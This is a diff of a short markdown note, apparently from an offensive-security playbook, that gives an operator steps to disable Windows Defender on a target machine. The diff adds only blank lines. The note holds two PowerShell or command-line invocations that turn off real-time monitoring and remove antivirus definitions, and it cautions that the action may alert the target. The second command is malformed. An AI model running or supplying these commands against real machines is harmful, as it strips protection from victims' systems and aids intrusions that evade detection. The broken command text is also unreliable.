@@ -30,11 +30,19 @@ If you have the available permissions attempt to disable defender on the target 
 
 If you have the available permissions attempt to disable defender on the target machine.
 
+
+
 (Chances are, this is deprecated for newer systems and may alert the target.)
+
+
 
 ## Instructions
 
 1. Run the following powershell script
+
+
+
+
 
 **Command** ([[Disable Defender]]):
 
@@ -42,7 +50,15 @@ If you have the available permissions attempt to disable defender on the target 
 Set-MpPReference -DisableRealtimeMonitoring $true -Verbose
 ```
 
+
+
+
+
 2. or if powershell is blocked try the following
+
+
+
+
 
 **Command** ([[Remove definitions and disable AV protection (Useful when Powershell scripts are being blocked by Defender)]]):
 
@@ -50,6 +66,10 @@ Set-MpPReference -DisableRealtimeMonitoring $true -Verbose
 c:\program files\windows defender\mpcmdrun.exe" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true
 
 ```
+
+
+
+
 
 ## Platforms
 
@@ -63,3 +83,5 @@ c:\program files\windows defender\mpcmdrun.exe" -RemoveDefinitions -All Set-MpPr
 ## Tags
 
 - [[Antivirus Bypass]]
+
+
